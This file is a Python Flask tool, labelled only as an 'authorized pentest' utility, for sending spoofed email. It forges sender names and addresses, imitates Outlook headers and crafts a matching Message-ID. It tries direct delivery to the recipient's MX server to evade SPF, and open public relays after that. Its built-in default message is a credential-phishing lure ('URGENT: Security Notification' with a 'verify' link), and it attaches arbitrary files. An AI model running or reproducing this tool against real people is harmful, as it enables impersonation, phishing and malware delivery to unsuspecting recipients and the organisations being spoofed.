import base64
import smtplib
import socket
import dns.resolver  # pip install dnspython
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from flask import Blueprint, request, jsonify, render_template_string

script11_bp = Blueprint("script11", __name__)

# --- CONFIGURATION ---
# OPTION A: SMTP2GO free tier (1000 emails/month, free signup, no credit card)
# OPTION B: Mailtrap.io (catches emails, doesn't deliver — great for testing)
# OPTION C: Gmail (requires App Password, enable 2FA)
# OPTION D: Direct relay to target's MX server (highest spoof success, needs open relay)

SMTP_MODE = "relay"  # "auth", "relay", "direct_mx"

# For authenticated SMTP
SMTP_CONFIG = {
    "server": "smtp.mailtrap.io",  # or smtp.gmail.com, smtp.sendgrid.net
    "port": 587,  # or 465 for SSL, 25 for plain
    "username": "",  # Fill these in
    "password": "",
    "use_tls": True,
}

# For direct MX relay (bypasses SPF checks if server is misconfigured)
# This tries to connect directly to the target's mail server
DIRECT_MX_FALLBACK = True

SPOOF_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>EMAIL SPOOF TEST - Authorized Pentest</title>
    <style>
        body { background: #0d0d0d; color: #0f0; font-family: 'Courier New', monospace; padding: 40px; text-align: center; }
        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; background: #1a1a1a; width: 550px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
        h2 { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
        .config-bar { background: #111; border: 1px solid #333; padding: 8px; margin-bottom: 15px; font-size: 11px; color: #888; text-align: left; }
        input, textarea { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 95%; margin-bottom: 12px; font-family: monospace; box-sizing: border-box; }
        input:focus, textarea:focus { outline: none; background: #050505; box-shadow: 0 0 8px #0f0; }
        select { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 95%; margin-bottom: 12px; font-family: monospace; }
        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; margin-top: 5px; }
        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
        .file-input { color: #0f0; margin-bottom: 12px; display: block; text-align: left; font-size: 0.9em; }
        #status { margin-top: 15px; font-weight: bold; min-height: 20px; font-size: 13px; white-space: pre-wrap; }
        .success { color: #fff; text-shadow: 0 0 5px #0f0; }
        .error { color: #ff4444; text-shadow: 0 0 5px red; }
        .warn { color: #ffaa00; text-shadow: 0 0 5px #aa5500; }
        .info { color: #00ccff; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>[ EMAIL SPOOF TEST - v3 ]</h2>
        <div class="config-bar">MODE: <span id="modeDisplay">SMTP Relay (Authenticated)</span> | Internal Use Only</div>
        
        <input type="text" id="from_name" placeholder="Display Name" value="System Administrator">
        <input type="email" id="from_email" placeholder="Spoofed From Email" value="noreply@target-org.com">
        <input type="email" id="reply_to" placeholder="Reply-To (optional)" value="">
        <input type="email" id="to_email" placeholder="Target Email *">
        <input type="text" id="subject" placeholder="Subject Line" value="URGENT: Security Notification">
        <textarea id="msg" placeholder="HTML Message Body" rows="4">Dear User,<br><br>Your account requires immediate verification.<br><br><a href="http://evil-internal-test.com">Click here to verify</a><br><br>IT Security Team</textarea>
        
        <select id="priority">
            <option value="1">High Priority</option>
            <option value="3" selected>Normal</option>
            <option value="5">Low Priority</option>
        </select>
        
        <p style="font-size: 10px; color: #888; margin: 5px 0;">Attachment (optional):</p>
        <input type="file" id="attachment" class="file-input">
        
        <button onclick="sendSpoof()">SEND TEST EMAIL</button>
        <div id="status"></div>
    </div>

    <script>
        async function sendSpoof() {
            const status = document.getElementById('status');
            const fileInput = document.getElementById('attachment');
            status.innerText = ">> Preparing payload...";
            status.className = "";

            let fileData = null;
            let fileName = "";
            
            if(fileInput.files.length > 0) {
                status.innerText = ">> Encoding attachment...";
                const file = fileInput.files[0];
                fileName = file.name;
                const reader = new FileReader();
                fileData = await new Promise((resolve, reject) => {
                    reader.onload = () => resolve(reader.result.split(',')[1]);
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            const payload = {
                from_name: document.getElementById('from_name').value,
                from_email: document.getElementById('from_email').value,
                reply_to: document.getElementById('reply_to').value,
                to_email: document.getElementById('to_email').value,
                subject: document.getElementById('subject').value,
                message: document.getElementById('msg').value,
                priority: document.getElementById('priority').value,
                file_content: fileData,
                file_name: fileName
            };

            status.innerText = ">> Connecting to SMTP server...";
            status.className = "info";

            try {
                const res = await fetch('/script11/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                
                if (data.status) {
                    status.innerText = ">> EMAIL SENT SUCCESSFULLY\n" + data.status;
                    if (data.warnings) {
                        status.innerText += "\n>> WARNINGS:\n" + data.warnings;
                        status.className = "warn";
                    } else {
                        status.className = "success";
                    }
                } else {
                    status.innerText = ">> FAILED: " + data.error;
                    if (data.tip) {
                        status.innerText += "\n>> TIP: " + data.tip;
                    }
                    status.className = "error";
                }
            } catch (e) {
                status.innerText = ">> CONNECTION ERROR: " + e.message;
                status.className = "error";
            }
        }
    </script>
</body>
</html>
"""


@script11_bp.route("/")
def index():
    return render_template_string(SPOOF_UI)


@script11_bp.route("/send", methods=["POST"])
def handle_send():
    data = request.get_json()

    # Validate required fields
    required = ['from_name', 'from_email', 'to_email', 'subject', 'message']
    for field in required:
        if field not in data or not data[field]:
            return jsonify({"error": f"Missing required field: {field}"}), 400

    # --- BUILD THE EMAIL WITH SPOOFED HEADERS ---
    msg = MIMEMultipart('mixed')
    msg['From'] = f"{data['from_name']} <{data['from_email']}>"
    msg['To'] = data['to_email']
    msg['Subject'] = data['subject']
    
    # Spoofing headers — emulate a legitimate mail client
    msg['X-Mailer'] = 'Microsoft Outlook 16.0.16026.20100'
    msg['X-MSMail-Priority'] = data.get('priority', '3')
    msg['Importance'] = 'High' if data.get('priority') == '1' else 'Normal'
    msg['X-Priority'] = data.get('priority', '3')
    
    # Reply-To (optional) — if set, replies go to a different address
    if data.get('reply_to'):
        msg['Reply-To'] = data['reply_to']
    
    # Message-ID — looks more legitimate with a FQDN
    import uuid
    domain = data['from_email'].split('@')[-1] if '@' in data['from_email'] else 'company.com'
    msg['Message-ID'] = f'<{uuid.uuid4().hex}@{domain}>'
    
    # Date header
    from email.utils import formatdate
    msg['Date'] = formatdate(localtime=True)
    
    # MIME boundary for HTML content
    msg_alt = MIMEMultipart('alternative')
    msg_alt.attach(MIMEText(
        data['message'].replace('<br>', '\n').replace('<br/>', '\n')
                       .replace('<br />', '\n').replace('</p>', '\n\n')
                       .replace('<li>', '  * ').replace('</li>', '\n'),
        'plain'
    ))
    msg_alt.attach(MIMEText(data['message'], 'html'))
    msg.attach(msg_alt)

    # Handle Attachment
    if data.get('file_content'):
        try:
            file_data = base64.b64decode(data['file_content'])
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file_data)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{data["file_name"]}"')
            msg.attach(part)
        except Exception as e:
            return jsonify({"error": f"Attachment encoding failed: {str(e)}"}), 500

    raw_email = msg.as_string()

    # --- SENDING STRATEGY ---
    warnings = []
    last_error = None

    # Strategy 1: Try authenticated SMTP relay first
    if SMTP_MODE in ("auth", "relay") and SMTP_CONFIG["username"]:
        try:
            return send_via_auth_smtp(raw_email, data, SMTP_CONFIG)
        except Exception as e:
            last_error = str(e)
            warnings.append(f"Auth SMTP failed: {e}")

    # Strategy 2: Try direct MX delivery (bypasses SPF checks if server is misconfigured)
    if DIRECT_MX_FALLBACK:
        try:
            return send_via_direct_mx(raw_email, data)
        except Exception as e:
            last_error = str(e)
            warnings.append(f"Direct MX failed: {e}")

    # Strategy 3: Try connecting to common relay ports on the mail domain
    try:
        return send_via_common_relay(raw_email, data)
    except Exception as e:
        last_error = str(e)
        warnings.append(f"Common relay failed: {e}")

    # All strategies failed
    tip = ("If targeting an internal test server, try running a local SMTP server: "
           "`python -m smtpd -c DebuggingServer -n 0.0.0.0:25`")
    if "authentication" in (last_error or "").lower():
        tip = ("SMTP requires authentication. Set SMTP_CONFIG with valid credentials. "
               "For Gmail: use an App Password (enable 2FA first). "
               "For Mailtrap: free account at mailtrap.io")
    
    return jsonify({
        "error": f"All delivery methods failed. Last error: {last_error}",
        "warnings": " | ".join(warnings) if warnings else None,
        "tip": tip
    }), 500


def send_via_auth_smtp(raw_email, data, config):
    """Send via authenticated SMTP (Mailtrap, Gmail, SendGrid, etc.)"""
    server = smtplib.SMTP(config["server"], config["port"], timeout=15)
    server.ehlo()
    
    if config["use_tls"]:
        server.starttls()
        server.ehlo()
    
    server.login(config["username"], config["password"])
    server.sendmail(data["from_email"], [data["to_email"]], raw_email)
    server.quit()
    
    return jsonify({
        "status": f"✓ Delivered to {data['to_email']} via {config['server']}",
        "warnings": None
    })


def send_via_direct_mx(raw_email, data):
    """
    Deliver directly to the target domain's MX server.
    This bypasses SPF checks from the origin SMTP server.
    Success depends on the target's DMARC policy and whether
    the receiving server does additional validation.
    """
    domain = data["to_email"].split('@')[-1]
    
    try:
        # Resolve MX records
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = sorted(answers, key=lambda r: r.preference)
        
        if not mx_records:
            raise Exception("No MX records found")
        
        mx_host = str(mx_records[0].exchange).rstrip('.')
        
        # Try ports 25, 587, 465 in order
        ports = [25, 587, 465]
        last_ex = None
        
        for port in ports:
            try:
                if port == 465:
                    # SSL/TLS
                    import ssl
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    server = smtplib.SMTP_SSL(mx_host, port, timeout=15, context=context)
                else:
                    server = smtplib.SMTP(mx_host, port, timeout=15)
                    server.ehlo()
                    if port == 587:
                        try:
                            server.starttls()
                            server.ehlo()
                        except:
                            pass  # TLS not required
                
                # Try sending without auth
                server.sendmail(data["from_email"], [data["to_email"]], raw_email)
                server.quit()
                
                return jsonify({
                    "status": f"✓ Delivered directly to MX ({mx_host}:{port}) for {domain}",
                    "warnings": "SPF/DKIM/DMARC checks may still apply. Check email headers for authentication results."
                })
                
            except smtplib.SMTPRecipientsRefused as e:
                last_ex = e
                continue
            except smtplib.SMTPResponseException as e:
                if e.smtp_code == 550:
                    # Relay denied — expected for properly configured servers
                    last_ex = e
                    continue
                raise
            except Exception as e:
                last_ex = e
                continue
        
        raise Exception(f"All ports blocked. Last error: {last_ex}")
        
    except dns.exception.DNSException as e:
        raise Exception(f"DNS resolution failed for {domain}: {e}")


def send_via_common_relay(raw_email, data):
    """Try common public SMTP relays that might accept (unlikely but worth trying)"""
    relays = [
        ("smtp.mailtrap.io", 587, False),
        ("smtp.sendgrid.net", 587, False),
    ]
    
    for host, port, use_tls in relays:
        try:
            server = smtplib.SMTP(host, port, timeout=10)
            server.ehlo()
            if use_tls:
                try:
                    server.starttls()
                    server.ehlo()
                except:
                    pass
            
            server.sendmail(data["from_email"], [data["to_email"]], raw_email)
            server.quit()
            
            return jsonify({
                "status": f"✓ Delivered via public relay {host}:{port}",
                "warnings": "Delivery via public relays is unreliable. Consider using authenticated SMTP."
            })
            
        except:
            continue
    
    raise Exception("No public relay accepted the connection")


# --- Run as standalone for testing ---
if __name__ == "__main__":
    from flask import Flask
    app = Flask(__name__)
    app.register_blueprint(script11_bp, url_prefix="/script11")
    print("[*] Email Spoof Test Tool loaded on /script11")
    print("[*] Configure SMTP_CONFIG with your test credentials")
    app.run(debug=True, port=5000)
